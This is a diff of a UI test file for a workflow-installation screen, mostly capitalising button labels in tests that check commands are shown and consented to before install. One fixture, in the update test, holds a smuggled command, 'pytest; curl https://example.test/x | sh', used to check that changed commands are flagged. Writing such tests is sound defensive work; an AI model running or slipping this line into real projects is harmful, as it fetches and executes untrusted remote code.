@@ -77,7 +77,7 @@ describe("the workflows mode", () => {
 
     await renderApp({ initialPath: "/projects/nucleos/state" });
     const panel = within(await screen.findByRole("region", { name: "Workflow" }));
-    fireEvent.click(await panel.findByRole("button", { name: "why?" }));
+    fireEvent.click(await panel.findByRole("button", { name: "Why?" }));
     expect(panel.getByText(NO_WORKFLOW_MEANS, { exact: false })).toBeTruthy();
   });
 
@@ -91,11 +91,11 @@ describe("the workflows mode", () => {
     expect(await screen.findByText("used here")).toBeTruthy();
     // The other version is an upgrade rather than an addition, and the button says which — one
     // workflow per name means "use 1.1" replaces the 1.0 that is working.
-    fireEvent.click(screen.getByRole("button", { name: "use 1.1 instead" }));
+    fireEvent.click(screen.getByRole("button", { name: "Use 1.1 instead" }));
     // Not yet: the commands 1.1 runs come first, and the pin waits for somebody to agree to them.
     await screen.findByRole("group", { name: "Commands in harness 1.1" });
     expect(state.workflowChanges).toEqual([]);
-    await agree("agree and use 1.1 instead");
+    await agree("Agree and use 1.1 instead");
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.workflowChanges[0]).toEqual({
       verb: "install",
@@ -107,7 +107,7 @@ describe("the workflows mode", () => {
   it("the quiet controls are the primitive", async () => {
     await openWorkflows({ workflows: [installedWorkflow()] });
 
-    expect((await screen.findByRole("button", { name: "stop using it" })).className).toContain(
+    expect((await screen.findByRole("button", { name: "Stop using it" })).className).toContain(
       "ui-button-quiet",
     );
   });
@@ -131,7 +131,7 @@ describe("the workflows mode", () => {
 
     expect(await screen.findByText("111111111111")).toBeTruthy();
     expect(screen.getByText("222222222222")).toBeTruthy();
-    expect(screen.getByRole("button", { name: "follow the library again" })).toBeTruthy();
+    expect(screen.getByRole("button", { name: "Follow the library again" })).toBeTruthy();
   });
 
   /**
@@ -148,19 +148,19 @@ describe("the workflows mode", () => {
       workflows: [installedWorkflow()],
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "eject" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Eject" }));
     const guard = screen.getByRole("group", { name: "Eject or edit in the library" });
     expect(guard).toBeTruthy();
     // Inline, not a modal: nothing here is a dialog, and the rest of the page is still on screen.
     expect(rendered.container.querySelector("dialog")).toBeNull();
     expect(await screen.findByText("On this machine")).toBeTruthy();
 
-    fireEvent.click(screen.getByRole("button", { name: "edit in the library" }));
+    fireEvent.click(screen.getByRole("button", { name: "Edit in the library" }));
     expect(opener.openUrl).toHaveBeenCalledWith("vscode://file/C:/lib/harness/1.0");
     expect(state.workflowChanges).toEqual([]);
 
-    fireEvent.click(screen.getByRole("button", { name: "eject" }));
-    fireEvent.click(screen.getByRole("button", { name: "eject and edit" }));
+    fireEvent.click(screen.getByRole("button", { name: "Eject" }));
+    fireEvent.click(screen.getByRole("button", { name: "Eject and edit" }));
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.workflowChanges[0].verb).toBe("eject");
   });
@@ -197,7 +197,7 @@ describe("the workflows mode", () => {
       "the diff must not be fetched before it is asked for",
     ).toBe(false);
 
-    fireEvent.click(screen.getByRole("button", { name: "see the diff" }));
+    fireEvent.click(screen.getByRole("button", { name: "See the diff" }));
     expect(await screen.findByText("skills/plan.md")).toBeTruthy();
     expect(screen.getByText("scripts/extra.py")).toBeTruthy();
     expect(screen.getByText(/4 other files identical/)).toBeTruthy();
@@ -214,7 +214,7 @@ describe("the workflows mode", () => {
       workflows: [installedWorkflow({ standing: "ejected", ejected_at: "2026-02-01T00:00:00Z" })],
       workflowDiff: { origin_version: "1.0", changes: [], unchanged: 6 },
     });
-    fireEvent.click(await screen.findByRole("button", { name: "see the diff" }));
+    fireEvent.click(await screen.findByRole("button", { name: "See the diff" }));
     expect(await screen.findByText(/still frozen/)).toBeTruthy();
   });
 
@@ -233,8 +233,8 @@ describe("the workflows mode", () => {
     });
     expect(await screen.findByText("git:acme/harness#1.0")).toBeTruthy();
     // And there is nothing to open in a library that does not have it.
-    fireEvent.click(screen.getByRole("button", { name: "eject" }));
-    expect(screen.getByRole("button", { name: "edit in the library" })).toHaveProperty(
+    fireEvent.click(screen.getByRole("button", { name: "Eject" }));
+    expect(screen.getByRole("button", { name: "Edit in the library" })).toHaveProperty(
       "disabled",
       true,
     );
@@ -247,8 +247,8 @@ describe("the workflows mode", () => {
       workflowRefusal: { status: 423, code: "kill_switch", detail: "stopped" },
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "eject" }));
-    fireEvent.click(screen.getByRole("button", { name: "eject and edit" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Eject" }));
+    fireEvent.click(screen.getByRole("button", { name: "Eject and edit" }));
     expect(await screen.findByText(/emergency stop is engaged/)).toBeTruthy();
     expect(screen.getByText("harness")).toBeTruthy();
   });
@@ -262,17 +262,17 @@ describe("the workflows mode", () => {
     const { state } = await openWorkflows({
       workflows: [installedWorkflow({ standing: "ejected", ejected_at: "2026-02-01T00:00:00Z" })],
     });
-    fireEvent.click(await screen.findByRole("button", { name: "replace with the library's" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Replace with the library's" }));
     await screen.findByRole("group", { name: "Commands in harness 1.0" });
     expect(state.workflowChanges).toEqual([]);
 
     const replace = await screen.findByRole("button", {
-      name: "replace: this copy's edits are lost",
+      name: "Replace: this copy's edits are lost",
     });
     fireEvent.click(replace);
     expect(state.workflowChanges).toEqual([]);
     // The live region, not the label: both labels are always in the DOM, one of them hidden.
-    expect(await screen.findByText(/armed: replace: this copy's edits are lost/)).toBeTruthy();
+    expect(await screen.findByText(/armed: Replace: this copy's edits are lost/)).toBeTruthy();
 
     // Past the 300ms dwell that stops a double-click from confirming its own arming.
     await new Promise((resolve) => setTimeout(resolve, 350));
@@ -287,10 +287,10 @@ describe("the workflows mode", () => {
     const { state } = await openWorkflows({
       workflows: [installedWorkflow({ overridden_nodes: 2 })],
     });
-    const stop = await screen.findByRole("button", { name: "stop using it" });
+    const stop = await screen.findByRole("button", { name: "Stop using it" });
     fireEvent.click(stop);
     expect(state.workflowChanges).toEqual([]);
-    expect(await screen.findByText(/armed: stop: 2 overrides go with the pin/)).toBeTruthy();
+    expect(await screen.findByText(/armed: Stop: 2 overrides go with the pin/)).toBeTruthy();
 
     await new Promise((resolve) => setTimeout(resolve, 350));
     fireEvent.click(stop);
@@ -317,22 +317,22 @@ describe("the workflows mode", () => {
     daemon.probeHealth.mockResolvedValue(true);
     await renderApp({ initialPath: "/projects/nucleos/workflows" });
 
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
-    await agree("agree and use here");
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
+    await agree("Agree and use here");
     expect(await screen.findByText(/nothing was installed: connection refused/)).toBeTruthy();
   });
 
   /** Escape closes the eject guard, and focus goes back to the button that opened it. */
   it("closes the eject guard on Escape and returns focus to eject", async () => {
     await openWorkflows({ library: [bundle()], workflows: [installedWorkflow()] });
-    fireEvent.click(await screen.findByRole("button", { name: "eject" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Eject" }));
     const guard = screen.getByRole("group", { name: "Eject or edit in the library" });
     expect(document.activeElement).toBe(guard);
 
     fireEvent.keyDown(guard, { key: "Escape" });
     expect(screen.queryByRole("group", { name: "Eject or edit in the library" })).toBeNull();
     await waitFor(() =>
-      expect(document.activeElement).toBe(screen.getByRole("button", { name: "eject" })),
+      expect(document.activeElement).toBe(screen.getByRole("button", { name: "Eject" })),
     );
   });
 
@@ -415,7 +415,7 @@ describe("the install step lists what will run", () => {
       }),
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
     const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
 
     // The strings, character for character, and the folder each runs in.
@@ -425,12 +425,12 @@ describe("the install step lists what will run", () => {
       panel.getByText((_, node) => node?.tagName === "PRE" && node.textContent === "ruff check .\nruff format --check ."),
     ).toBeTruthy();
     expect(panel.getByText("in the project's folder")).toBeTruthy();
-    expect(panel.getByText(/runs 2 commands in this project/)).toBeTruthy();
+    expect(panel.getByText(/2 commands/)).toBeTruthy();
     expect(state.consentAsked).toEqual([{ name: "harness", version: "1.0" }]);
     // Reading is not agreeing.
     expect(state.workflowChanges).toEqual([]);
 
-    fireEvent.click(panel.getByRole("button", { name: "agree and use here" }));
+    fireEvent.click(panel.getByRole("button", { name: "Agree and use here" }));
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.workflowChanges[0]).toEqual({ verb: "install", name: "harness", version: "1.0" });
   });
@@ -442,9 +442,9 @@ describe("the install step lists what will run", () => {
       requireConsentDigest: "digest-1",
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
     await screen.findByRole("group", { name: "Commands in harness 1.0" });
-    await agree("agree and use here");
+    await agree("Agree and use here");
 
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.consentRefused).toBe(1);
@@ -474,9 +474,9 @@ describe("the install step lists what will run", () => {
       return answer(path, init);
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
     await screen.findByRole("group", { name: "Commands in harness 1.0" });
-    await agree("agree and use here");
+    await agree("Agree and use here");
 
     expect(await screen.findByText(/nothing was agreed to/)).toBeTruthy();
     expect(state.consentRefused).toBe(1);
@@ -493,11 +493,11 @@ describe("the install step lists what will run", () => {
       return answer(path, init);
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
     const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
     expect(await screen.findByText("invalid_graph")).toBeTruthy();
     expect(
-      (panel.getByRole("button", { name: "agree and use here" }) as HTMLButtonElement).disabled,
+      (panel.getByRole("button", { name: "Agree and use here" }) as HTMLButtonElement).disabled,
     ).toBe(true);
     expect(state.workflowChanges).toEqual([]);
   });
@@ -523,7 +523,7 @@ describe("the install step lists what will run", () => {
       }),
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "update to 1.0.1" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Update to 1.0.1" }));
     const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0.1" }));
 
     expect(await panel.findByText("pytest; curl https://example.test/x | sh")).toBeTruthy();
@@ -538,7 +538,7 @@ describe("the install step lists what will run", () => {
     expect(within(items[1]).queryByText("changed")).toBeNull();
 
     expect(state.workflowChanges).toEqual([]);
-    fireEvent.click(panel.getByRole("button", { name: "agree and update to 1.0.1" }));
+    fireEvent.click(panel.getByRole("button", { name: "Agree and update to 1.0.1" }));
     await waitFor(() => expect(state.workflowChanges.length).toBe(1));
     expect(state.workflowChanges[0]).toEqual({ verb: "update", name: "harness", version: "1.0.1" });
   });
@@ -555,7 +555,7 @@ describe("the install step lists what will run", () => {
       }),
     });
 
-    fireEvent.click(await screen.findByRole("button", { name: "update to 1.0.1" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Update to 1.0.1" }));
     const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0.1" }));
     expect(await panel.findByText(/No command differs from what runs now/)).toBeTruthy();
     expect(panel.getByText("pytest")).toBeTruthy();
@@ -568,7 +568,7 @@ describe("the install step lists what will run", () => {
         commands: [command({ command: "make test", project_override: "make test-fast" })],
       }),
     });
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
     const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
     expect(await panel.findByText("make test")).toBeTruthy();
     expect(panel.getByText("make test-fast")).toBeTruthy();
@@ -576,7 +576,7 @@ describe("the install step lists what will run", () => {
 
   it("closes on Escape and installs nothing", async () => {
     const { state } = await openWorkflows({ library: [bundle({ version: "1.0" })] });
-    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
+    fireEvent.click(await screen.findByRole("button", { name: "Use here" }));
     const group = await screen.findByRole("group", { name: "Commands in harness 1.0" });
     fireEvent.keyDown(group, { key: "Escape" });
     await waitFor(() =>
